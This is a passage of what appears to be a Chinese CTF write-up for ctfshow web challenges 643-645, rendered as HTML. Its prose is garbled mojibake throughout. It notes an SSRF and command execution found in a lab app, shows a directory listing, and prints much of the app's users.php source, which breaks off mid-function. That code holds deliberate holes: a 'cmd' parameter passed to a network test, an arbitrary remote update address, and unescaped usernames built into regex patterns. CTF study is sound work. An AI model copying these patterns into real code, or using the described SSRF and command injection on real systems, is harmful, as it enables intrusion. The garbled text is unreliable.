†åŠŸèƒ½æŒ¨ä¸ªå»è¯•ä¸€è¯•ï¼Œä½†æ˜¯é»‘ç›’ï¼Œè¿™é‡Œå…¶å®è¿˜å¯ä»¥é¡ºä¾¿å»æ‰«ä¸€ä¸‹è¿™ä¸ªç›®å½•ï¼</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><ol><li>æ•°æ®å¤‡ä»½æ‹¿åˆ°web645çš„flag</li><li>è¿œç¨‹æ›´æ–°å‘ç°æœ‰ä¸ªssrfå¯ä»¥ç”¨æ¥è¯»æœ¬åœ°æ–‡ä»¶</li><li>ç½‘ç»œæµ‹è¯•å¯ä»¥æ‰§è¡Œä»…å­—æ¯rceï¼ˆls åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰</li></ol><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db/</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static/</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªåˆ©ç”¨ssrfå»è¯»ï¼Œsecret.txtæ‹¿åˆ°web643çš„flag</p><p>users.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-26 10:25:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-08-01 01:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(DB_PATH);</span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">getUsers</span>(<span class="variable">$data</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;limit&#x27;</span>]));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">addUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">delUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">updateUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;backup&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">backupUsers</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">recoveryUsers</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;phpInfo&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">phpInfoTest</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;netTest&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">netTest</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;remoteUpdate&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">remoteUpdate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;update_address&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;authKeyValidate&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">authKeyValidate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilString&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilString</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilNumber&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilNumber</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilFunction&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilFunction</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilArray&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilArray</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilClass&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilClass</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–å¤±è´¥&#x27;</span>,</span><br><span class="line">));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$page</span>=<span class="number">1</span>,<span class="variable">$limit</span>=<span class="number">10</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–æˆåŠŸ&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;data&#x27;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$isadmin</span> = <span class="string">&#x27;å¦&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;æ— &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$users</span>);</span><br><span class="line"><span class="variable">$index</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$u</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$isadmin</span> = <span class="string">&#x27;æ˜¯&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;flagå°±æ˜¯ç®¡ç†å‘˜çš„å¯†ç ï¼Œä¸è¿‡æˆ‘éšè—äº†&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;åˆ é™¤æ­¤æ¡è®°å½•åflagå°±ä¼šæ¶ˆå¤±&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$index</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$pass</span>,</span><br><span class="line"><span class="string">&#x27;isAdmin&#x27;</span>=&gt;<span class="variable">$isadmin</span>,</span><br><span class="line"><span class="string">&#x27;content&#x27;</span>=&gt;<span class="variable">$content</span></span><br><span class="line">));</span><br><span class="line"><span class="variable">$index</span> +=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="variable">$index</span>;</span><br><span class="line"><span class="variable">$start</span> = (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="title function_ invoke__">array_slice</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$start</span>,<span class="variable">$limit</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ·»åŠ æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·å·²å­˜åœ¨&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ›´æ–°æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨æˆ–æ— æƒæ›´æ–°&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨æˆ–æ— æƒåˆ é™¤&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backupUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_name</span> = DB_PATH;</span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">file_exists</span> (<span class="variable">$file_name</span> )) &#123;    </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 NOT FOUND&#x27;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span> (<span class="variable">$file_name</span>, <span class="string">&quot;rb&quot;</span> ); </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> ); </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );  </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>));  </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-Disposition: attachment; filename=backup.dat&quot;</span>);     </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(FLAG645, <span class="string">&#x27;flagå°±åœ¨è¿™é‡Œï¼Œå¯æƒœä¸èƒ½ç»™ä½ &#x27;</span>, <span class="title function_ invoke__">fread</span> ( <span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>)));    </span><br><span class="line">    <span class="title function_ invoke__">fclose</span> ( <span class="variable">$file</span> );    </span><br><span class="line">    <span class="keyword">exit</span> ();    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span>(<span class="params"><span class="variable">$total</span>, <span class="variable">$times</span>, <span class="variable">$min</span>, <span class="variable">$max</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$min</span> * <span class="variable">$times</span> &gt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$max</span> * <span class="variable">$times</span> &lt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$times</span> &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$times</span>--;</span><br><span class="line">            <span class="variable">$kmix</span> = <span class="title function_ invoke__">max</span>(<span class="variable">$min</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$max</span>);</span><br><span class="line">            <span class="variable">$kmax</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$max</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$min</span>);</span><br><span class="line">            <span class="variable">$kAvg</span> = <span class="variable">$total</span> / (<span class="variable">$times</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$kDis</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$kAvg</span> - <span class="variable">$kmix</span>, <span class="variable">$kmax</span> - <span class="variable">$kAvg</span>);</span><br><span class="line">            <span class="variable">$r</span> = ((<span class="keyword">float</span>)(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) / <span class="number">10000</span>) - <span class="number">0.5</span>) * 